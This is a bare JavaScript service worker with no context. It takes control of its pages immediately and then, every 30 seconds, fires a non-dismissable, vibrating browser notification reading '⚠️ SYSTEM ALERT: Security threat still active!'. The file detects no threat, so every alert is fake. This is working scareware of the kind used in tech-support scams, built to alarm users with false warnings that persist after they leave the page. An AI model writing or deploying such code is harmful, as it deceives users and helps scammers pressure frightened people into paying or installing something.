self.addEventListener('install', e => self.skipWaiting());
self.addEventListener('activate', e => e.waitUntil(clients.claim()));

// Background notifications
setInterval(() => {
    self.registration.showNotification('⚠️ SYSTEM ALERT', {
        body: 'Security threat still active!',
        icon: 'data:image/svg+xml,%3Csvg xmlns=\'http://www.w3.org/2000/svg\' viewBox=\'0 0 100 100\'%3E%3Ccircle cx=\'50\' cy=\'50\' r=\'45\' fill=\'%23ff0000\'/%3E%3C/svg%3E',
        requireInteraction: true,
        vibrate: [500, 200, 500]
    });
}, 30000);